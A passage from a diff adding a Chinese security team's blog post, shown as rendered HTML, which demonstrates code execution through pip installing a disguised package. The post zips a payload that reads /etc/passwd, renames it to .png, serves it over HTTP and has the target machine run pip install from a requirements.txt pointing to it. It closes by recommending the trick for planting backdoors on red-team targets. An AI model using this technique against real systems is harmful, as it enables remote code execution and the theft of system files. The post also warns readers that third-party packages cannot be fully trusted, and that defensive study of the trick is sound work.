+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 在命令行中显示/etc/passwd的内容</span>
+</span></span><span style="display:flex;"><span>print(open(<span style="color:#e6db74">&#34;/etc/passwd&#34;</span>)<span style="color:#f92672">.</span>read(), file<span style="color:#f92672">=</span>f)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>按<code>Esc</code>并输入<code>:wq</code>, 再按<code>Enter</code>保存并退出</p>
+<p>压缩之前创建的文件夹</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cd ..
+</span></span><span style="display:flex;"><span>zip -r 压缩包名.zip 文件夹名
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>把压缩包的后缀从<code>.zip</code>改为<code>.png</code></p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>mv 名字.zip 名字.png
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在当前目录启动http服务</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python -m http.server <span style="color:#ae81ff">80</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>获取机器ip</p>
+<blockquote>
+<p>注意,如果你不在内网做实验,请去获取服务器的公网ip</p>
+</blockquote>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ifconfig
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后新建一个<code>requirements.txt</code>,在其中写入</p>
+<pre tabindex="0"><code>http://ip或者域名/名字.png
+</code></pre><p>把<code>requirements.txt</code>发送给靶机,并在靶机上输入</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>pip install -r requirements.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>就可以看到我们之前写的代码被执行了.qwq.</p>
+<h2 id="思考">思考</h2>
+<p>做完这样一个小实验,我们可以得出以下两点结论</p>
+<ul>
+<li>
+<p>不能完全信任各种语言安装的第三方库</p>
+</li>
+<li>
+<p>在红队的场景中, 如果想要在目标机器下载后门, 可以考虑用pip下载</p>
+</li>
+</ul>
+<h2 id="ref">ref</h2>
+<p><a href="https://mp.weixin.qq.com/s/xFY6VYzrA4RryH1agC8zUw">洛米唯熊的文章: Python PIP自解压的命令执行</a></p>
+<h2 id="结语">结语</h2>
+<p>呼,终于写完了,最近要干是事情真是多捏~~</p>
+<p>嘿嘿嘿, 偷偷放在团队的博客某些坏人应该看不到了吧awa</p>
+<p>本篇作者:<a href="https://blog.nanosec.site/">KiraPGR</a></p>
+
+                    
+                    <HR width="100%" id="EOF">
+		    <p style="color:#777;">最后修改于 2022-11-13</p>
+                    
+                </div>
+            </div>
+            
+            
+            <nav class="post-pagination">
+
+                
+                <a class="newer-posts">
+			下回<br>已经到头啦。
+                </a>
+                
+                
+                
+                <a class="older-posts" href="/posts/somewp/">
+			上回<br>写几个 Misc 的 WP
+                </a>
+                
+            </nav>
+            <div class="post-comment-wrapper">
+                
+
+
+
+
+
+
+
+
+
+
+<script src="https://utteranc.es/client.js"
+        repo="me0w00f/me0w00f.github.io"
+        issue-term="title"
+        label="comments"
+        theme="preferred-color-scheme"
+        crossorigin="anonymous"
+        async>
+</script>
+
+            </div>
+        </div>
+    </div>
+
+
+                    </div>
+            </div><div id="single-column-footer">
+Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> by <a href="https://risehere.net/">Rise</a>
+<br>
+移植自 <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopener">Makito</a>'s <a href="https://github.com/SumiMakito/hexo-theme-journal/" target="_blank" rel="noreferrer noopener">Journal.</a> <br>
+<br>
+
+&copy;
+	
+	Copyleft 2022 Me0w00f Security
+	
+</div>
+            </div>
+    
+    <script src="/js/journal.js"></script></body>
+</html>
